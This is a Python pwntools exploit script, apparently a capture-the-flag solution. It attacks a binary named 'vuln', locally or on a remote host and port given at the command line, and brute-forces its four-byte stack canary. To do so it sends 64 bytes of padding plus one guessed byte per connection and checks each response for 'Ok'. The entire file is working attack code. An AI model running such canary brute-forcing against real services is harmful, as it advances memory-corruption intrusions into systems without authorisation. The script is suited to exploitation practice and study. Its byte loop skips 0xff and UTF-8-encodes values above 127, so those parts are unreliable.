#!/usr/bin/env python3
from pwn import *
from time import sleep
from itertools import permutations
import time


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# from buffer to stack canary
pad1 = 64

# The stored values from the leaked canary
canary = ['A', 'A', 'A', 'A']

# loop through all 4 entries of the canary
for i in range(4):
    # loop through all possible bytes for each entry
    for c in range(255):    
        p = start();
        p.recv()
        p.sendline(b"-1"); 
        p.recv()

        payload = b"A" * pad1 # initial padding
        payload += "".join(canary[0:i]).encode() # the canary we've leaked so far
        payload += chr(c).encode() # the new character to try
        print(payload)
        p.send(payload)
        recv = p.recv()
        p.close()

        # Check the output
        if b'Ok' in recv:
            canary[i] = chr(c) # add the found value
            break

print("".join(canary))